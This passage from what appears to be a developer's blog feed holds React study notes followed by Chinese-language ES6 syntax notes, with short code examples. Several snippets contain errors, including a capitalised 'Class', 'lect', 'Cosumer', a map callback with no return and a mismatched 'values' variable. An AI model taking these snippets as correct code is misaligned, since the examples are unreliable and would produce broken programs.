state.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReactDom.render(&lt;h1&gt;hello!&lt;/h1&gt;, document.getElementById(&apos;root&apos;))</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-Components-and-Props"><a href="#1-3-Components-and-Props" class="headerlink" title="1.3 Components and Props"></a>1.3 Components and Props</h4><p>Components let you split the UI into independent, reusable pieces, and think about each piece in isolation. Conceptually, components are like Javascript functions.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Use an ES6 class to define a component</span><br><span class="line">Class Welcome extends React.Component&#123;</span><br><span class="line">  render()&#123;</span><br><span class="line">    return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(&lt;Welcome /&gt;, document.getElementById(‘root’))</span><br></pre></td></tr></table></figure></p><p>Elements can represent user-defined components. When React sees an element representing a user-defined component, if passes JSX attributes to this component as a single object. We call this object as “props”.</p><ul><li>We call <code>ReactDOM.render()</code> with the <code>&lt;Welcome name=&quot;Sara&quot; /&gt;</code> element.</li><li>React calls the <code>Welcome</code> component with <code>{name: &#39;Sara&#39;}</code> as the props.</li><li>Our <code>Welcome</code> comonent returns a <code>&lt;h1&gt;hello, Sara&lt;/h1&gt;</code> element as the result.</li><li>React DOM efficiently updates the DOM to match <code>&lt;h1&gt;hello, Sara&lt;/h1&gt;</code><br><br></li></ul><h4 id="1-4-State-and-Lifecycle"><a href="#1-4-State-and-Lifecycle" class="headerlink" title="1.4 State and Lifecycle"></a>1.4 State and Lifecycle</h4><p>State allows React components to change their output over time in response to user actions, network responses, and anything else.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Clock extends React.Component &#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    date: &apos;2018-01-02&apos;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;h2&gt;It is &#123;this.state.date&#125;&lt;/h2&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Lifecycle</strong></p><ul><li>componetDidMount()</li><li>componentWillUnmount()</li></ul><p><strong>Using State Correctly</strong></p><ul><li>Do Not modify state directly: the only place where you can assign <code>this.state</code> is the constructor. Using <code>this.setState({ comment: &#39;hello&#39;})</code></li><li>State updates may be asynchronous: so you should not rely on their values for calculating the next state.</li><li>State updates are merged<br><br></li></ul><h4 id="1-5-Handling-Events"><a href="#1-5-Handling-Events" class="headerlink" title="1.5 Handling Events"></a>1.5 Handling Events</h4><p>React defines these synthetic events（<code>e</code>） according to the W3C.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Clock extends React.Component &#123;</span><br><span class="line">  handleClick = (e) =&gt; &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    console.log(&apos;click&apos;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;button onClick=&#123;this.handleClick&#125;&gt;&lt;/button&gt;</span><br><span class="line">        &lt;button onClick=&#123;this.handleClick.bind(this, id)&#125;&gt;&lt;/button&gt;</span><br><span class="line">        &lt;button onClick=&#123;(e) =&gt; this.handleaClick(id, e)&#125;&gt;&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-6-Conditinal-Rendering"><a href="#1-6-Conditinal-Rendering" class="headerlink" title="1.6 Conditinal Rendering"></a>1.6 Conditinal Rendering</h4><ul><li><p>Inline if with logical &amp;&amp; operator</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; a.length &gt; 0 &amp;&amp; &lt;h1&gt;Show&lt;/h1&gt; &#125;</span><br></pre></td></tr></table></figure></li><li><p>Inline if-else with conditional operator</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; a.length &gt; 0 ? &apos;current&apos; : null &#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-7-Lists-and-Keys"><a href="#1-7-Lists-and-Keys" class="headerlink" title="1.7 Lists and Keys"></a>1.7 Lists and Keys</h4><ul><li>Rendering multiple components<br>Keys helop React identify which items have changed, are added, or are moved. <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  [1,2,3,4].map((item, index) =&gt; &#123;</span><br><span class="line">      &lt;div key=&#123;index&#125;&gt;&#123;item&#125;&lt;/div&gt;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-8-Forms"><a href="#1-8-Forms" class="headerlink" title="1.8 Forms"></a>1.8 Forms</h4><ul><li>Controlled Components<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handleChange(event)&#123;</span><br><span class="line">  console.log(event.target.value)</span><br><span class="line">&#125;</span><br><span class="line">&lt;input type=&quot;text&quot; value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125;&gt;</span><br><span class="line">&lt;select value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125;&gt;</span><br><span class="line">  &lt;option value=&quot;grapefruit&quot;&gt;Grapefruit&lt;/option&gt;</span><br><span class="line">  &lt;option value=&quot;lime&quot;&gt;Lime&lt;/option&gt;</span><br><span class="line">  &lt;option value=&quot;coconut&quot;&gt;Coconut&lt;/option&gt;</span><br><span class="line">  &lt;option value=&quot;mango&quot;&gt;Mango&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-Advanced-Guides"><a href="#2-Advanced-Guides" class="headerlink" title="2. Advanced Guides"></a>2. Advanced Guides</h3><h4 id="2-1-Accessibility"><a href="#2-1-Accessibility" class="headerlink" title="2.1 Accessibility"></a>2.1 Accessibility</h4><p><br></p><h4 id="2-2-Code-Splitting"><a href="#2-2-Code-Splitting" class="headerlink" title="2.2 Code-Splitting"></a>2.2 Code-Splitting</h4><p>Set up route-based code splitting into your app using <code>React Router</code> and <code>React Loadable</code><br><br></p><h4 id="2-3-Context"><a href="#2-3-Context" class="headerlink" title="2.3 Context"></a>2.3 Context</h4><p>Context is designed to share data that can be considered “global” for a tree of React component, such as the current authenticated user, theme, or preferred language.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 1. React.createContext</span><br><span class="line">const &#123;Provider, Consumer&#125; = React.createContext(defaultValue)</span><br><span class="line"></span><br><span class="line">// 2. Provider</span><br><span class="line">&lt;Provider value=&#123;/* some value*/&#125;&gt;</span><br><span class="line"></span><br><span class="line">// 3. Consumer</span><br><span class="line">&lt;Cosumer&gt;</span><br><span class="line">  &#123; value =&gt; /* render something based on the context value */&#125;</span><br><span class="line">&lt;/Cosumer&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-Error-Boundaries"><a href="#2-4-Error-Boundaries" class="headerlink" title="2.4 Error Boundaries"></a>2.4 Error Boundaries</h4><p>Error boundaries are React components that catch Javascript errors anywhere in their component tree, log those errors, and display a fallback UI.<br><br></p><h4 id="2-5-Forwarding-Refs"><a href="#2-5-Forwarding-Refs" class="headerlink" title="2.5 Forwarding Refs"></a>2.5 Forwarding Refs</h4><p>Ref forwarding is a technique for automatically passing a ref through a component to one of its children.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const FancyButton = React.forwardRef((props, ref) =&gt; (</span><br><span class="line">  &lt;button ref=&#123;ref&#125; className=&quot;FancyButton&quot;&gt;</span><br><span class="line">    &#123;props.children&#125;</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">// You can now get a ref directly to the DOM button:</span><br><span class="line">const ref = React.createRef();</span><br><span class="line">&lt;FancyButton ref=&#123;ref&#125;&gt;Click me!&lt;/FancyButton&gt;;</span><br></pre></td></tr></table></figure></p><p>Here is a step-by-step explanation of what happens in the above example:</p><ul><li><ol><li>We create a <code>React ref</code> by calling <code>React.createRef</code> and assign it to a <code>ref</code> variable.</li></ol></li><li><ol start="2"><li>We pass our <code>ref</code> down to <code>&lt;FancyButton ref={ref}&gt;</code> by specifying it as a JSX attribute.</li></ol></li><li><ol start="3"><li>React passes the <code>ref</code> to the <code>(props, ref) =&gt; ...</code> function inside <code>forwardRef</code> as a second argument.</li></ol></li><li><ol start="4"><li>We forward this <code>ref</code> argument down to <code>&lt;button ref={ref}&gt;</code> by specifying it as a JSX attribute.</li></ol></li><li><ol start="5"><li>When the ref is attached, <code>ref.current</code> will point to the <code>&lt;button&gt;</code> DOM node.</li></ol></li></ul><h4 id="2-6-Fragments"><a href="#2-6-Fragments" class="headerlink" title="2.6 Fragments"></a>2.6 Fragments</h4><p>Fragments let you group a list of children without adding extra nodes to the DOM.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Columns extends React.Component &#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;React.Fragment&gt;</span><br><span class="line">        &lt;td&gt;Hello&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;World&lt;/td&gt;</span><br><span class="line">      &lt;/React.Fragment&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// There is a new, shorter syntax you can use for declaring fragments. It looks like empty tags:</span><br><span class="line">return(</span><br><span class="line">  &lt;&gt;</span><br><span class="line">    &lt;td&gt;Hello&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;World&lt;/td&gt;</span><br><span class="line">  &lt;/&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h4 id="2-7-Higher-Order-Components"><a href="#2-7-Higher-Order-Components" class="headerlink" title="2.7 Higher-Order Components"></a>2.7 Higher-Order Components</h4><p>Concretely, a higher-order component is a function that takes a component and returns a new component. HOCs are common in third-party React libraries, such as Redux’s <code>connect</code>.</p><ul><li>On mount, add a change listener to <code>DataSource</code>.</li><li>Inside the listener, call <code>setState</code> whenever the data source changes.</li><li>On unmount, remove the change listener.</li></ul><p>You can image that in a large app, this same pattern of subscribing to <code>DataSource</code> and calling <code>setState</code> will occur over and over again. We want an abstraction that allows us to define this logic in a single place and share it across many components. This is where higher-order components excel.</p><p>We can write a function that creates component, like CommentList that subscribe to <code>DataSource</code>. The first parameter is the wrapped component. The second parameter retrieves the data we’re interested in, given a <code>DataSource</code> and the current props.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">const CommentListWithSubscription = withSubscription(</span><br><span class="line">  CommentList,</span><br><span class="line">  (DataSource, props) =&gt; DataSource.getComments(props.id)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">function withSubscription(WrappedComponent, selectData) &#123;</span><br><span class="line">  return class extends React.Component &#123;</span><br><span class="line">    state &#123;</span><br><span class="line">      data: selectData(DataSource, props)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">      DataSource.addChangeListener(this.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line">      DataSource.removeChangeListener(this.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleChange() &#123;</span><br><span class="line">      this.setState(&#123;</span><br><span class="line">        data: selectData(DataSource, this.props)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      return &lt;WrappedComponent data=&#123;this.state.data&#125; &#123;...this.props&#125;&gt;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-8-Integrating-with-Other-Libraries"><a href="#2-8-Integrating-with-Other-Libraries" class="headerlink" title="2.8 Integrating with Other Libraries"></a>2.8 Integrating with Other Libraries</h4><ol><li><p>Intergrate with DOM Manipulation Plugins, like jQuery. Many jQuery plugins attach event listeners to the DOM so it’s important to detach them in componentWillUnmount.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class SomePlugin extends React.Component&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    this.$el = $(this.el);</span><br><span class="line">    this.handleChange = this.handleChange.bind(this);</span><br><span class="line">    this.$el.on(&apos;change&apos;, this.handleChange)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    this.$el.off(&apos;change&apos;, this.handleChange)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange(e) &#123;</span><br><span class="line">    console.log(e.target.value)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;select ref=&#123;el =&gt; this.el = el&#125;&gt;</span><br><span class="line">        &lt;option value=1&gt;1&lt;/option&gt;</span><br><span class="line">        &lt;option value=2&gt;2&lt;/option&gt;</span><br><span class="line">      &lt;/select&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>React can be embedded into other applications thanks to the flexibility of <code>ReactDOM.render()</code>. This lets us write applications in React piece by piece, and combine them with our existing server-generated templates and other client-side code.</p></li></ol>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ES6语法</title>
      <link href="/2018/10/15/ES6/"/>
      <url>/2018/10/15/ES6/</url>
      <content type="html"><![CDATA[<h3 id="1-块级作用域-let-var-const"><a href="#1-块级作用域-let-var-const" class="headerlink" title="1. 块级作用域, let, var, const"></a>1. 块级作用域, let, var, const</h3><ul><li><em>块级声明</em><br>声明在指定块的作用域之外无法访问的变量。存在于函数内部和块<code>{}</code>中。一旦执行到块外会立即销毁。</li></ul><ul><li><p>var声明的变量<br>其作用域为该语句所在的函数内，且存在变量提升现象</p></li><li><p>let声明的变量<br>其作用域为该语句所在的代码块内，不存在变量提升；</p></li><li><p>const声明的是常量<br>在后面出现的代码中不能再修改该常量的值。<br>需要注意的是，const里面只存了一个值，可以是一个地址(object)，也可以是一个值(string/number/..)。当const定义的是地址的时候，我们可以修改实际指向的object的内容，但是不可以修改这个指向地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;</span><br><span class="line">obj.a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj);  <span class="comment">// &#123; a: 2 &#125;</span></span><br><span class="line">obj = &#123; <span class="attr">a</span>: <span class="number">2</span> &#125;     <span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-模板字面量"><a href="#2-模板字面量" class="headerlink" title="2. 模板字面量"></a>2. 模板字面量</h3><p>实现了多行字符串，将变量的值嵌入字符串，HTML转义(向HTML插入经过安全转换后的字符串)的能力</p><ul><li><p>在反撇号中所有空白符都属于字符串的一部分.你可以显示地使用<code>\n</code>来指明换行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">`hello</span></span><br><span class="line"><span class="string">world`</span>; </span><br><span class="line"><span class="built_in">console</span>.log(a.length) <span class="comment">// 16</span></span><br></pre></td></tr></table></figure></li><li><p>占位符<code>${}</code> 中可以包含Javascript表达式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">`hello, <span class="subst">$&#123;count&#125;</span>`</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="string">`hello, <span class="subst">$&#123;(count * <span class="number">2</span>).toFixed(<span class="number">2</span>)&#125;</span>`</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3. 函数"></a>3. 函数</h3><ul><li><p>为形参提供默认值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">num = getValue(</span>), <span class="title">timeout</span> = 2000, <span class="title">callback</span> = <span class="title">function</span>(<span class="params"></span>)</span>&#123;&#125;)&#123;&#125;</span><br><span class="line">a(<span class="number">20</span>, <span class="literal">null</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(<span class="string">'1'</span>)&#125;)    <span class="comment">// 不使用默认值</span></span><br></pre></td></tr></table></figure></li><li><p>默认参数的临时死区</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">first, second = getValue(first</span>))</span>&#123;</span><br><span class="line">  <span class="comment">// 执行add()时，相当于执行以下代码来创建first和second参数值</span></span><br><span class="line">  <span class="comment">// let first = 1; </span></span><br><span class="line">  <span class="comment">// let second = getValue(1) </span></span><br><span class="line">  <span class="keyword">return</span> first + second;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)  <span class="comment">// 7</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-1-不定参数-…"><a href="#3-1-不定参数-…" class="headerlink" title="3.1 不定参数(…)"></a>3.1 不定参数(…)</h4><p>不定参数可以让你指定多个独立的参数，通过整合后的数组来访问。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkArgs</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(args.length);       <span class="comment">// 2</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.length);  <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line">checkArgs(<span class="string">"a"</span>, <span class="string">"b"</span>)</span><br><span class="line"><span class="comment">// 使用限制：每个函数只能声明一个不定参数，且一定要放在所有参数的末尾</span></span><br></pre></td></tr></table></figure></p><h4 id="3-2-展开运算符-…"><a href="#3-2-展开运算符-…" class="headerlink" title="3.2 展开运算符(…)"></a>3.2 展开运算符(…)</h4><p>展开运算符可以让你指定一个数组，将它们打散后作为独立的参数传入函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.max(...values));</span><br><span class="line"><span class="comment">// 等价于console.log(Math.max(1,2,3,4))</span></span><br></pre></td></tr></table></figure></p><h4 id="3-3-箭头函数"><a href="#3-3-箭头函数" class="headerlink" title="3.3 箭头函数"></a>3.3 箭头函数</h4><p>箭头函数是一种使用箭头(=&gt;)定义函数的新语法</p><ul><li>箭头函数中的<code>this, super, arguments, new.target</code>的值由外围最近一层非箭头函数决定</li><li>箭头函数不能被用作构造函数，不能通过<code>new</code>调用</li><li>没有原型，不存在<code>prototype</code>这个属性</li><li>函数内部的<code>this</code>值不可被改变</li><li>不支持<code>arguments</code>对象</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="params">()</span> =&gt;</span> <span class="string">'Nicholas'</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">lect c = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> d = <span class="function"><span class="params">id</span> =&gt;</span> (&#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">'Temp'</span>&#125;) <span class="comment">// 让箭头向外返回一个对象，应包裹在小括号里</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-对象"><a href="#4-对象" class="headerlink" title="4. 对象"></a>4. 对象</h3><h4 id="4-1-简写、可计算的属性名"><a href="#4-1-简写、可计算的属性名" class="headerlink" title="4.1 简写、可计算的属性名"></a>4.1 简写、可计算的属性名</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> suffix = <span class="string">"name"</span>;</span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name,</span><br><span class="line">  [<span class="string">'first'</span> + suffix]: <span class="string">'Zakas'</span>,</span><br><span class="line">  sayName() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-Object-assign"><a href="#4-2-Object-assign" class="headerlink" title="4.2 Object.assign"></a>4.2 Object.assign</h4><p>接受任意数量的源对象，并按指定的顺序将属性复制到接收对象中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(&#123;&#125;,&#123;<span class="attr">type</span>: <span class="string">'js'</span>, <span class="attr">name</span>: <span class="string">'file.js'</span>&#125;, &#123;<span class="attr">type</span>: <span class="string">'css'</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(receiver.type)  <span class="comment">// 'css'</span></span><br></pre></td></tr></table></figure></p><h4 id="4-3-super"><a href="#4-3-super" class="headerlink" title="4.3 super"></a>4.3 super</h4><p>简化原型访问的<code>super</code>引用，指向对象原型的指针，实际是<code>Object.getPrototypeOf(this)</code>的值。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">  getGreeting()&#123; <span class="keyword">return</span> <span class="string">'hello '</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> friend = &#123;</span><br><span class="line">  getGreeting() &#123; <span class="keyword">return</span> <span class="keyword">super</span>.getGreeting() + <span class="string">'friend'</span> &#125; <span class="comment">// hello friend</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-解构"><a href="#5-解构" class="headerlink" title="5. 解构"></a>5. 解构</h3><p>简化获取信息的过程，无需深入整个数据结构找到数据，编写代码为变量赋值。</p><ul><li><p>对象解构</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;<span class="attr">type</span>: <span class="string">'Identifier'</span>, <span class="attr">name</span>: <span class="string">'foo'</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; type, name &#125; = node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为非同名局部变量赋值</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">type</span>: localType, <span class="attr">name</span>: localName &#125; = node;</span><br><span class="line"><span class="built_in">console</span>.log(localType)   <span class="comment">// 'Identifier'</span></span><br></pre></td></tr></table></figure></li><li><p>数组解构</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">"red"</span>, <span class="string">"green"</span>];</span><br><span class="line"><span class="keyword">let</span> [firstColor, secondColor] = colors;</span><br><span class="line"><span class="built_in">console</span>.log(firstColor)   <span class="comment">// "red"</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-类"><a href="#6-类" class="headerlink" title="6. 类"></a>6. 类</h3><p>ES6使用<code>class</code>，取代需要<code>prototype</code>的操作。</p><h4 id="6-1-constructor"><a href="#6-1-constructor" class="headerlink" title="6.1 constructor()"></a>6.1 constructor()</h4><p>用<code>constructor</code>方法名来定义构造函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 